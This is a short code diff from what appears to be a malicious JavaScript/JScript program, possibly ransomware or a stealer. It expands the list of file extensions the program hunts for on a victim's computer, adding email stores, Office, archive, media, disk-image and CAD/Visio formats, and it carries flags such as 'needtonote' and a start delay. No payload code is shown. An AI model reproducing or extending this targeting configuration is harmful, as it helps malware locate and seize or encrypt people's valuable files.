@@ -3,15 +3,29 @@ try {
 	////////////////////////////////////////////////////////////
 	var needtonote = false; 
 	////////////////////////////////////////////////////////////
-	var filecheckdelay = 43200; //Delay before next file and programs check (in min)//// 43200 (1 month)///
-	var ext = [ //files extensions for search
-	"eml","dbx","pst","txt","rtf","doc","docx","ttf",
-	"pdf","djvu","rar","zip","xls","xlsx","ppt","pptx",
-	"mdb","accdb","cda","wav","wma","mp3","avi","mpg",
-	"mpeg","mdv","flv","swf","divx","wmv","bmp","gif",
-	"jpg","jpeg","tiff","png","iso","mdf","mds","bin",
-	"nrg"
+var ext = [ //files extensions for search
+	"eml", //windows live mail
+	"dbx", //outlook express
+	"pst","ost", //ms outlook
+	"tbb", //the bat
+	"msf", //thunderbird
+	"txt", //text files
+	"rtf","doc","docx","docm","dot","dotm","dotx","odt", "wps", //ms word
+	"xls","xlsx","csv","dbf","dif","ods","prn","slk","xla","xlam","xlsb","xlsm","xlt","xltm","xltx","xlw","xml","xps", //ms excel
+	"ppt","pptx","pot","potm","potx","ppa","ppam","pps","ppsm","ppsx","pptm", //ms powerpoint
+	"mdb","accdb", //ms access
+	"rar","zip","arj","7z", //archives
+	"ttf", //fonts
+	"pdf", //adobe acrobat
+	"djvu", //djvu
+	"cda","wav","wma","mp3","avi","mpg","mpeg","mdv","flv","swf","divx","wmv", //media
+	"bmp","gif","jpg","jpeg","tiff","png", //изображения
+	"iso","mdf","mds","bin","nrg", //drive images
+	"dwg","dfx","dgn","stl","dwt", //autocad
+	"cdw","cdt","m3d","a3d", //compas 
+	"vsd","vss","vst","vdx","vsx","vtx","vsl","vsdx","vsdm" //visio
 	]; 
+
 	//var ext = ["eml","dbx","zip","txt","rtf","doc","docx"]; //files extensions for search
 	//var fileextensions_inprofile = ["txt","rtf","doc","docx","ttf","pdf","djvu","rar","zip","xls","xlsx","ppt","pptx","mdb","accdb","cda","wav","wma","mp3","avi","mpg","mpeg","mdv","flv","swf","divx","wmv","bmp","gif","jpg","jpeg","tiff","png","iso","mdf","mds","bin","nrg"];
 	var waittime = 0; // wait before start (in min)
